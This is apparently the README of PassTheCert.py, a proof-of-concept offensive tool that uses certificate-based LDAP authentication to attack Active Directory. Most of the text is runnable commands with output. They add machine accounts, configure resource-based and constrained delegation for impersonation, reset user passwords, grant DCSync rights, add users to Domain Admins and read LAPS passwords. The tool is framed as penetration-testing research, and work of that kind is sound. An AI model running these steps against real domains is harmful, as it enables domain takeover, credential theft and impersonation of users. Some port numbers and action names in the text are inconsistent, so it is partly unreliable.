PassTheCert.py
==============

This POC implements LDAP certificate authentication for two impacket scripts:
[addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
and [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py).
You can perform LDAP certificate authentication both on port 686 and 389 (via a
StarTLS command). Please note that you need a functional LDAPS service on the
targeted domain controller to successfully use StartTLS on the LDAP port.

More information in the [accompanying blog post](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

If you use [Certipy](https://github.com/ly4k/Certipy) to retrieve certificates, you can extract key and cert from the pfx by using:

```console
$ certipy cert -pfx user.pfx -nokey -out user.crt
$ certipy cert -pfx user.pfx -nocert -out user.key
```

Usage
-----

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: passthecert.py [-h] [-debug] [-port {389,636}]
                      [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami,ldap-shell}]]
                      [-target sAMAccountName] [-new-pass [Password]] [-elevate] [-baseDN DC=test,DC=local]
                      [-computer-group CN=Computers] [-domain test.local] [-domain-netbios NETBIOSNAME]
                      [-computer-name COMPUTER-NAME$] [-computer-pass password]
                      [-delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local] [-delegate-to DELEGATE_TO]
                      [-delegate-from DELEGATE_FROM] [-dc-host hostname] [-dc-ip ip] -crt user.crt -key user.key

Manage domain computers and perform RBCD attack via LDAP certificate authentication

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -port {389,636}       Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.

Action:
  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami,ldap-shell}]

Manage User:
  -target             sAMaccountnames   sAMAccountName of user to target.
  -new-pass           [Password]        New password of target.
  -elevate                              Grant target account DCSYNC rights

Manage Computer:
  -baseDN             DC=test,DC=local  Set baseDN for LDAP.If omitted, the domain part (FQDN) specified in the account parameter will be used.
  -computer-group     CN=Computers      Group to which the account will be added.If omitted, CN=Computers will be used,
  -domain             test.local        Target domain fqdn
  -domain-netbios     NETBIOSNAME       Domain NetBIOS name. Required if the DC has multiple domains.
  -computer-name      COMPUTER-NAME$    Name of computer to add.If omitted, a random DESKTOP-[A-Z0-9]{8} will be used.
  -computer-pass      password          Password to set to computer. If omitted, a random [A-Za-z0-9]{32} will be used.
  -delegated-services cifs/srv01.domain.local,ldap/srv01.domain.local Services to configure in constrained delegation to configure to the new computer (no space in the list)

RBCD attack:
  -delegate-to        DELEGATE_TO       Target computer account the attacker has at least WriteProperty to
  -delegate-from      DELEGATE_FROM     Attacker controlled machine account to write on the msDS-Allo[...] property (only when using `-action write`)

Authentication:
  -dc-host hostname     Hostname of the domain controller to use. If omitted, the domain part (FQDN) specified in the account
                        parameter will be used
  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.
  -crt user.crt         User's certificate
  -key user.key         User's private key

```

Actions
-------
* Manage Computer
  * `add_computer`: Add a computer to the domain
  * `del_computer`: Delete a computer from the domain
  * `modify_computer`: Modify the password of the computer

* Manage User
  * `forcePWDchange` : Modify the password of the user

* Constrained delegation attack
  * `add_computer -delegated-services`: Add a computer configured with constrained delegated services store in `msDS-AllowedToDelegateTo` new computer's attributes.

* RBCD attack
  * `read_rbcd`: Read `msDS-AllowedToActOnBehalfOfOtherIdentity` and resolve SIDs to `sAMaccountnames`
  * `write_rbcd`: Write new SIDs to `the msDS-AllowedToActOnBehalfOfOtherIdentity`
  * `remove_rbcd`: Remove specific entries
  * `flush_rbcd`: Flush all entries

* Misc
  * `whoami`: Return the user represented by the certificate
  * `ldap-shell`: Authenticate with the certificate via Schannel against LDAP and spawn an interactive LDAP shell

Examples
--------

Create a computer via LDAPS:

```console
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account DESKTOP-CKDRXFUX$ with password dzy3pjZqEH6f4Igql5dp4I5Dx8uA4PrV.
```

Create a computer via LDAPS with custom name/password:

```console
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -computer-pass SheSellsSeaShellsOnTheSeaShore
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account OFFSECMACHINE$ with password SheSellsSeaShellsOnTheSeaShore.
```

Create a computer via LDAPS with custom name and with constrained delegated services configured (cifs and ldap over SRV-MAIL.domain.local):

```console
$ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -delegated-services cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

[+] Adding constrained delegations to the new computer object: cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
[*] Successfully added machine account OFFSECMACHINE$ with password kUwdbHeuTw64QvaLzUYHrjfgE7hrRigS
```

Add a delegation right via StartTLS on port 389:

```console
$ python3 passthecert.py -action write_rbcd -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -port 389 -delegate-to DESKTOP-CKDRXFUX$ -delegate-from SRV-MAIL$
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] SRV-MAIL$ can now impersonate users on DESKTOP-CKDRXFUX$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     SRV-MAIL$    (S-1-5-21-XXXXXXXXX-YYYYYYYYYY-WWWWWWWW-1109)
```

Change a password of a user 

```console
$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -new-pass
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

[*] Successfully changed kpayne password to: ZqIrfZdt02OIq5Ek0ZZPcQKRWKEMEOKB
```

Elevate a user for DCSYNC

```console
$ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -elevate
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

[*] Granted user 'user_sam' DCSYNC rights!
```

Spawn an interactive LDAP shell and add a user to a specific domain group

```console
$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

# add_user_to_group user_sam "Domain Admins"
Adding user: user_sam to group Domain Admins result: OK
```

*Note: The above example assumes that the domain account for which the certificate was issued, holds privileges to add users to the target domain group.*

Spawn an interactive LDAP shell and retrieve all groups the user is a member of

```console
$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

# get_user_groups user_sam
CN=Domain Admins,CN=Users,DC=plak,DC=local
```

Spawn an interactive LDAP shell and retrieve the LAPS password of a specific computer

```console
$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation

# get_laps_password SRV-MAIL$
Found Computer DN: CN=SRV-MAIL,OU=Mail,OU=Standard,OU=Servers,DC=domain,DC=local
LAPS Password: #x0i{S4UF%42x50
```

*Note: The above example assumes that the domain account for which the certificate was issued, holds privileges to read LAPS passwords in the domain.*

Credits
-------

- [JaGoTu (@jagotu)](https://twitter.com/jagotu) for [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
- [Remi Gascou (@podalirius_)](https://twitter.com/podalirius_) and [Charlie Bromberg (@_nwodtuhs)](https://twitter.com/_nwodtuhs) for [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py)
- [Impacket](https://github.com/SecureAuthCorp/impacket) by [SecureAuth](https://www.secureauth.com/)
